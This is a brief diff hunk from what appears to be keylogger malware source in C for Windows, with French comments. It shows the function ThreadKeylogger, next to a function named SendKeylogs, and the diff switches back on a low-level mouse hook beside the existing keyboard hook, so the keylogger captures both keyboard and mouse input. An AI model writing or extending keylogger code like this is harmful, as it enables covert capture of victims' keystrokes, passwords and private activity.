@@ -326,7 +326,7 @@ VOID SendKeylogs()
 DWORD WINAPI ThreadKeylogger()
 {
     //Hooks sur le clavier et la souris pour le keylogger
-    if (!MySetWindowsHookExW(WH_KEYBOARD_LL, (HOOKPROC)HookProc, NULL, 0))// || !MySetWindowsHookExW(WH_MOUSE_LL, (HOOKPROC)HookProc, NULL, 0))
+    if (!MySetWindowsHookExW(WH_KEYBOARD_LL, (HOOKPROC)HookProc, NULL, 0) || !MySetWindowsHookExW(WH_MOUSE_LL, (HOOKPROC)HookProc, NULL, 0))
         ExitThread(EXIT_FAILURE);
 
     MSG msg;
